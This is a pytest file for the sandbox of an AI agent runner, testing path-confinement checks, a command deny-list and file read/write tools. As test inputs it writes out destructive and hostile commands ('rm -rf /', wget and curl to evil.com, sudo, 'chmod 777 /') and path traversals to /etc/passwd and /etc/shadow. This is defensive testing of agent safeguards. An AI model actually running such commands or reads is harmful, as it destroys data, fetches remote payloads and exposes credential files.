#!/usr/bin/env python3
"""Sandbox tests for agent_runner.py."""



import os
import tempfile

from agent_runner import (
    AgentRunner,
    _is_command_safe,
    _is_path_safe,
)

# ═══════════════════════════════════════════════════════
# _is_path_safe  tests
# ═══════════════════════════════════════════════════════

class TestIsPathSafe:
    def test_normal_file_inside_workdir(self):
        """A normal file inside work_dir should be safe."""
        with tempfile.TemporaryDirectory() as td:
            filepath = os.path.join(td, "file.txt")
            assert _is_path_safe(filepath, td) is True

    def test_workdir_itself_is_safe(self):
        """The work_dir path itself should be safe."""
        with tempfile.TemporaryDirectory() as td:
            assert _is_path_safe(td, td) is True

    def test_path_traversal_blocked(self):
        """Path traversal (../etc/passwd) should be unsafe."""
        with tempfile.TemporaryDirectory() as td:
            filepath = os.path.join(td, "..", "etc", "passwd")
            assert _is_path_safe(filepath, td) is False

    def test_absolute_path_outside_workdir(self):
        """Absolute path outside work_dir should be unsafe."""
        with tempfile.TemporaryDirectory() as td:
            assert _is_path_safe("/etc/passwd", td) is False
            assert _is_path_safe("/tmp/../etc/shadow", td) is False

    def test_blocked_path_denied(self):
        """Paths matching SANDBOX_BLOCKED_PATHS should be unsafe."""
        with tempfile.TemporaryDirectory() as td:
            assert _is_path_safe("/etc/shadow", td) is False
            assert _is_path_safe("/etc/ssh/ssh_config", td) is False

    def test_symlink_outside_blocked(self):
        """A symlink inside work_dir pointing outside should be blocked."""
        with tempfile.TemporaryDirectory() as td:
            link_path = os.path.join(td, "evil_link")
            os.symlink("/etc/passwd", link_path)
            assert _is_path_safe(link_path, td) is False

    def test_nested_subdirectory_is_safe(self):
        """A path nested inside work_dir should be safe."""
        with tempfile.TemporaryDirectory() as td:
            sub = os.path.join(td, "sub", "dir")
            os.makedirs(sub)
            filepath = os.path.join(sub, "test.txt")
            assert _is_path_safe(filepath, td) is True

    def test_current_dir_is_safe(self):
        """The '.' path inside work_dir should resolve safely."""
        with tempfile.TemporaryDirectory() as td:
            # os.path.realpath('.') resolves to CWD, so join explicitly
            assert _is_path_safe(os.path.join(td, "."), td) is True


# ═══════════════════════════════════════════════════════
# _is_command_safe  tests
# ═══════════════════════════════════════════════════════

class TestIsCommandSafe:
    def test_normal_commands_pass(self):
        """Normal commands like echo, ls, python should pass."""
        assert _is_command_safe("echo hello") is True
        assert _is_command_safe("ls -la") is True
        assert _is_command_safe("python3 script.py") is True
        assert _is_command_safe("gcc -o output source.c") is True
        assert _is_command_safe("make all") is True

    def test_rm_rf_blocked(self):
        """'rm -rf /' and 'rm -rf /*' should be blocked (substring match)."""
        assert _is_command_safe("rm -rf /") is False
        assert _is_command_safe("rm -rf /*") is False
        # Note: "rm -rf /" appears as substring in "rm -rf /var" too
        assert _is_command_safe("rm -rf /var") is False

    def test_sudo_blocked(self):
        """Commands containing 'sudo' should be blocked."""
        assert _is_command_safe("sudo rm file.txt") is False
        assert _is_command_safe("sudo apt install") is False

    def test_wget_blocked(self):
        """Commands containing 'wget' should be blocked."""
        assert _is_command_safe("wget http://evil.com/payload") is False

    def test_curl_blocked(self):
        """Commands containing 'curl' should be blocked."""
        assert _is_command_safe("curl http://evil.com") is False

    def test_chmod_777_blocked(self):
        """'chmod 777 /' should be blocked."""
        assert _is_command_safe("chmod 777 /") is False

    def test_empty_command_is_safe(self):
        """Empty string should be considered safe (no blocked patterns)."""
        assert _is_command_safe("") is True

    def test_case_insensitive_block(self):
        """Blocked command check should be case-insensitive."""
        assert _is_command_safe("SUDO apt install") is False
        assert _is_command_safe("WGET http://evil.com") is False


# ═══════════════════════════════════════════════════════
# _run_tool — execute_command  tests
# ═══════════════════════════════════════════════════════

class TestRunToolExecuteCommand:
    def test_blocked_command_returns_error(self):
        """A blocked command should return an error dict."""
        runner = AgentRunner.__new__(AgentRunner)
        with tempfile.TemporaryDirectory() as td:
            result = runner._run_tool("execute_command",
                                       {"command": "rm -rf /"}, td)
            assert "error" in result
            assert "沙箱拦截" in result["error"] or "Path outside workspace" in result["error"]

    def test_empty_command_returns_error(self):
        """Empty command string should return an error."""
        runner = AgentRunner.__new__(AgentRunner)
        with tempfile.TemporaryDirectory() as td:
            result = runner._run_tool("execute_command",
                                       {"command": "  "}, td)
            assert "error" in result
            assert "空命令" in result["error"]

    def test_unknown_tool_returns_error(self):
        """Unknown tool name should return an error."""
        runner = AgentRunner.__new__(AgentRunner)
        with tempfile.TemporaryDirectory() as td:
            result = runner._run_tool("nonexistent_tool", {}, td)
            assert "error" in result
            assert "未知工具" in result["error"]


# ═══════════════════════════════════════════════════════
# _run_tool — read_file  tests
# ═══════════════════════════════════════════════════════

class TestRunToolReadFile:
    def test_normal_read(self):
        """Reading an existing file inside work_dir should succeed."""
        runner = AgentRunner.__new__(AgentRunner)
        with tempfile.TemporaryDirectory() as td:
            filepath = os.path.join(td, "test.txt")
            with open(filepath, "w") as f:
                f.write("hello world")
            result = runner._run_tool("read_file",
                                       {"path": "test.txt"}, td)
            assert "error" not in result
            assert result["content"] == "hello world"

    def test_path_traversal_blocked(self):
        """Reading a file via path traversal should be blocked."""
        runner = AgentRunner.__new__(AgentRunner)
        with tempfile.TemporaryDirectory() as td:
            result = runner._run_tool("read_file",
                                       {"path": "../etc/passwd"}, td)
            assert "error" in result
            assert "沙箱拦截" in result["error"] or "Path outside workspace" in result["error"]

    def test_absolute_path_outside_blocked(self):
        """Reading an absolute path outside work_dir should be blocked."""
        runner = AgentRunner.__new__(AgentRunner)
        with tempfile.TemporaryDirectory() as td:
            result = runner._run_tool("read_file",
                                       {"path": "/etc/passwd"}, td)
            assert "error" in result
            assert "沙箱拦截" in result["error"] or "Path outside workspace" in result["error"]

    def test_file_not_found(self):
        """Reading a non-existent file should return a file-not-found error."""
        runner = AgentRunner.__new__(AgentRunner)
        with tempfile.TemporaryDirectory() as td:
            result = runner._run_tool("read_file",
                                       {"path": "does_not_exist.txt"}, td)
            assert "error" in result
            assert "文件不存在" in result["error"]


# ═══════════════════════════════════════════════════════
# _run_tool — write_file  tests
# ═══════════════════════════════════════════════════════

class TestRunToolWriteFile:
    def test_normal_write(self):
        """Writing a file inside work_dir should succeed."""
        runner = AgentRunner.__new__(AgentRunner)
        with tempfile.TemporaryDirectory() as td:
            result = runner._run_tool("write_file",
                                       {"path": "output.txt", "content": "test content"}, td)
            assert "error" not in result
            assert result["written"] is True
            # Verify file was written
            filepath = os.path.join(td, "output.txt")
            with open(filepath) as f:
                assert f.read() == "test content"

    def test_path_traversal_blocked(self):
        """Writing via path traversal should be blocked."""
        runner = AgentRunner.__new__(AgentRunner)
        with tempfile.TemporaryDirectory() as td:
            result = runner._run_tool("write_file",
                                       {"path": "../evil.txt", "content": "malicious"}, td)
            assert "error" in result
            assert "沙箱拦截" in result["error"] or "Path outside workspace" in result["error"]

    def test_absolute_path_outside_blocked(self):
        """Writing to an absolute path outside work_dir should be blocked."""
        runner = AgentRunner.__new__(AgentRunner)
        with tempfile.TemporaryDirectory() as td:
            result = runner._run_tool("write_file",
                                       {"path": "/tmp/outside.txt", "content": "test"}, td)
            assert "error" in result
            assert "沙箱拦截" in result["error"] or "Path outside workspace" in result["error"]

    def test_creates_subdirectories(self):
        """Writing to a nested path should create parent directories."""
        runner = AgentRunner.__new__(AgentRunner)
        with tempfile.TemporaryDirectory() as td:
            result = runner._run_tool("write_file",
                                       {"path": "sub/dir/nested.txt", "content": "nested"}, td)
            assert "error" not in result
            filepath = os.path.join(td, "sub", "dir", "nested.txt")
            assert os.path.isfile(filepath)
            with open(filepath) as f:
                assert f.read() == "nested"
